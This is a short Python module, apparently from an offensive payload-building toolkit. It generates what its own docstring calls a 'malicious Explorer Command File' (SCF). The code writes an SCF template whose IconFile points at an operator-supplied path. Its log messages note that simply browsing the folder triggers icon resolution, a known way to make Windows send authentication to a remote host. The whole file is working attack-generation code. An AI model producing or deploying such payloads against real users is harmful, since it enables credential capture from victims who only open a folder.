#!/usr/bin/env python
# encoding: utf-8

import logging
from modules.payload_builder import PayloadBuilder

SCF_TEMPLATE = \
r"""
[Shell]
Command=2
IconFile=<<<ICON_FILE>>>
[Taskbar]
Command=ToggleDesktop
"""

class SCFGenerator(PayloadBuilder):
    """ Module used to generate malicious Explorer Command File"""
    
    def check(self):
        return True
        
    
    def generate(self):
                
        logging.info(f" [+] Generating {self.outputFileType} file...")        

        # Fill template
        scfContent = SCF_TEMPLATE
        scfContent = scfContent.replace("<<<ICON_FILE>>>", self.mpSession.icon)

        with open(self.outputFilePath, 'w') as f:
            f.writelines(scfContent)
        logging.info(f"   [-] Generated SCF file: {self.outputFilePath}")
        logging.info("   [-] Test with: \nBrowse %s dir to trigger icon resolution. Click on file to toggle desktop.\n" % self.outputFilePath)
        

        
        
        